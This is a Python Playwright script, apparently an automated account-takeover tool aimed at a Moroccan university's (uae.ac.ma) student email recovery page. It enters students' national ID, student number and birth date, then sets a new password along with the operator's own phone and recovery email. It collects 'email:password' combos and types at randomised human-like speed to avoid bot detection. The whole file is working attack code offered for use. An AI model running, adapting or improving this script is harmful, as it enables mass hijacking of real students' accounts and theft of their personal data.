"""
UAE RECUPMAIL ENGINE — Final Complete, Secure & Polished Version
- Exact HTML ID targeting (#CNE, #CIN, #birthDate, #etablissement, #new_password, #password_check, #phone, #email_perso)
- Slow human-like typing speed
- Smart AJAX state detection (Page 1 error, Password modified, Activation page)
- Robust loader waiting and green success confirmation check
"""

import re
import time
import random
from integrations.pass_manager import PassManager
from integrations.contact_manager import ContactManager

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    UNKNOWN = "unknown"

class UAEEngine:
    def __init__(self):
        self.pass_manager = PassManager()
        self.contact_manager = ContactManager()

    def run_workflow(self, page, arg1, arg2, arg3="", arg4=""):
        cne = str(arg1).strip()
        cin = str(arg2).strip()
        dob = str(arg3).strip()

        result_data = {
            "cne": cne,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            # 1. استقرار الصفحة
            try:
                page.wait_for_load_state("domcontentloaded", timeout=25000)
            except Exception:
                pass

            page.wait_for_timeout(1000)

            # 2. تعبئة الحقول الأولى (CNE, CIN, DOB) بسرعة بشرية بطيئة ومريحة
            try:
                cne_input = page.locator('input#CNE').first
                cne_input.click()
                page.wait_for_timeout(300)
                cne_input.fill("")
                for char in str(cne):
                    cne_input.press_sequentially(char, delay=random.randint(200, 350))
                page.wait_for_timeout(500)

                cin_input = page.locator('input#CIN').first
                cin_input.click()
                page.wait_for_timeout(300)
                cin_input.fill("")
                for char in str(cin):
                    cin_input.press_sequentially(char, delay=random.randint(200, 350))
                page.wait_for_timeout(500)

                clean_dob = re.sub(r'[^0-9]', '', str(dob))
                if len(clean_dob) == 8:
                    day = clean_dob[:2]
                    month = clean_dob[2:4]
                    year = clean_dob[4:]
                    formatted_dob = f"{day}/{month}/{year}"
                else:
                    formatted_dob = str(dob)

                dob_input = page.locator('input#birthDate').first
                dob_input.click()
                page.wait_for_timeout(300)
                dob_input.fill("")
                for char in str(formatted_dob):
                    dob_input.press_sequentially(char, delay=random.randint(200, 350))
                page.wait_for_timeout(600)

            except Exception as e:
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = f"Failed: Input filling error - {str(e)}"
                return result_data

            # 3. اختيار المؤسسة (Etablissement) عشوائياً
            try:
                select_elem = page.locator('select#etablissement').first
                if select_elem.count() > 0:
                    options = select_elem.locator('option').all_inner_texts()
                    valid_options = [opt.strip() for opt in options if opt.strip() and "choisissez" not in opt.lower()]
                    if valid_options:
                        chosen_etab = random.choice(valid_options)
                        select_elem.select_option(label=chosen_etab)
                        page.wait_for_timeout(400)
                        page.keyboard.press("Enter")
                        page.wait_for_timeout(600)
            except Exception:
                pass

            # 4. النقر على زر الاسترجاع في الصفحة الأولى
            btn_clicked = False
            for btn_sel in [
                'button:has-text("Récupérer mon compte")',
                'button[type="submit"]',
                '.btn-primary'
            ]:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0 and btn.is_visible():
                        btn.click()
                        btn_clicked = True
                        break
                except Exception:
                    continue

            if not btn_clicked:
                try:
                    page.locator('button').filter(has_text=re.compile(r'récupérer|recuperer', re.I)).first.click()
                except Exception:
                    pass

            # 5. انتظار استجابة الـ AJAX وقراءة حالة الصفحة بالذكاء المطلوب
            page.wait_for_timeout(3500)

            page_state = page.evaluate("""() => {
                const bodyText = document.body.innerText.toLowerCase();
                
                const errKeywords = ["veuillez vérifier l'exactitude", "aucun étudiant trouvé", "email académique non généré", "aucune inscription trouvée", "incorrect", "invalide", "erreur"];
                for (let kw of errKeywords) {
                    if (bodyText.includes(kw)) return "page1_error";
                }

                if (bodyText.includes("précédemment été modifié") || bodyText.includes("déjà été modifié")) {
                    return "password_modified";
                }

                const passInput = document.querySelector('input#new_password');
                if (passInput || bodyText.includes("changer le mot de passe")) {
                    return "activation_page";
                }

                return "unknown";
            }""")

            if page_state == "page1_error":
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect student data (Page 1 Error)"
                return result_data

            if page_state == "password_modified":
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Password already modified"
                return result_data

            if page_state == "activation_page":
                extracted_email = page.evaluate("""() => {
                    const hiddenEmail = document.querySelector('input[name="email"]');
                    if (hiddenEmail && hiddenEmail.value) return hiddenEmail.value.trim().toLowerCase();
                    const match = document.body.innerText.match(/[\\w\\.-]+@(?:[\\w-]+\\.)*etu\\.uae\\.ac\\.ma/i);
                    return match ? match[0].toLowerCase() : null;
                }""")

                if not extracted_email or "uae.ac.ma" not in extracted_email:
                    result_data["status"] = LoginState.LOGIN_ERROR
                    result_data["detail"] = "Failed: Student academic email extraction failed"
                    return result_data

                target_password = self.pass_manager.get_password()
                mobile_phone, secondary_email = self.contact_manager.get_contact()

                # أ. إدخال الباسورد الجديد وتأكيده بسرعة بطيئة ومريحة (Human typing)
                try:
                    pass1 = page.locator('input#new_password').first
                    pass2 = page.locator('input#password_check').first

                    pass1.click()
                    pass1.fill("")
                    for char in target_password:
                        pass1.press_sequentially(char, delay=random.randint(180, 300))
                    
                    pass2.click()
                    pass2.fill("")
                    for char in target_password:
                        pass2.press_sequentially(char, delay=random.randint(180, 300))
                    page.wait_for_timeout(600)
                except Exception as e:
                    result_data["status"] = LoginState.UNKNOWN
                    result_data["detail"] = f"Failed: Password fields fill error - {str(e)}"
                    return result_data

                # ب. إدخال الهاتف (#phone) والإيميل الثانوي (#email_perso) بسرعة بطيئة وهادئة
                try:
                    phone_input = page.locator('input#phone').first
                    email_perso_input = page.locator('input#email_perso').first

                    phone_input.click()
                    phone_input.fill("")
                    for char in str(mobile_phone):
                        phone_input.press_sequentially(char, delay=random.randint(150, 280))
                    
                    page.wait_for_timeout(500)

                    email_perso_input.click()
                    email_perso_input.fill("")
                    for char in str(secondary_email):
                        email_perso_input.press_sequentially(char, delay=random.randint(150, 280))
                except Exception as e:
                    result_data["status"] = LoginState.UNKNOWN
                    result_data["detail"] = f"Failed: Contact fields fill error - {str(e)}"
                    return result_data

                page.wait_for_timeout(800)

                # ج. النقر على الزر الرئيسي لتغيير كلمة المرور `button#set_password`
                chg_clicked = False
                try:
                    btn_change = page.locator('button#set_password').first
                    if btn_change.count() > 0 and btn_change.is_visible():
                        btn_change.click()
                        chg_clicked = True
                except Exception:
                    pass

                if not chg_clicked:
                    for chg_btn in ['button:has-text("Changer le mot de passe")', 'button[type="submit"]']:
                        try:
                            b = page.locator(chg_btn).first
                            if b.count() > 0 and b.is_visible():
                                b.click()
                                chg_clicked = True
                                break
                        except Exception:
                            continue

                # 6. انتظار انتهاء الـ Loader تماماً مهما كانت الكونيكسيون ثقيلة (حتى 15 ثانية كحد أقصى)
                try:
                    page.wait_for_selector('img#loader, img#pw-loader', state='hidden', timeout=15000)
                except Exception:
                    page.wait_for_timeout(4000)

                # 7. الانتظار حتى تظهر رسالة النجاح الخضراء بصفة مؤكدة قبل إرسال LOGIN_OK
                success_detected = False
                for _ in range(20):
                    page.wait_for_timeout(500)
                    body_check = page.evaluate("""() => {
                        const bodyText = document.body.innerText.toLowerCase();
                        return bodyText.includes("succès") || 
                               bodyText.includes("success") || 
                               bodyText.includes("modifié avec succès") || 
                               bodyText.includes("félicitations") ||
                               bodyText.includes("votre mot de passe") ||
                               !document.querySelector('input#new_password');
                    }""")
                    if body_check:
                        success_detected = True
                        break

                if success_detected:
                    final_combo = f"{extracted_email}:{target_password}"
                    result_data["status"] = LoginState.LOGIN_OK
                    result_data["extracted_email"] = final_combo
                    result_data["detail"] = final_combo
                    return result_data
                else:
                    result_data["status"] = LoginState.UNKNOWN
                    result_data["detail"] = "Failed: Success confirmation message not detected after loading"
                    return result_data

            result_data["status"] = LoginState.LOGIN_ERROR
            result_data["detail"] = "Failed: Unknown response state"

        except Exception as e:
            result_data["status"] = LoginState.UNKNOWN
            result_data["detail"] = f"Failed: Exception - {type(e).__name__}"

        return result_data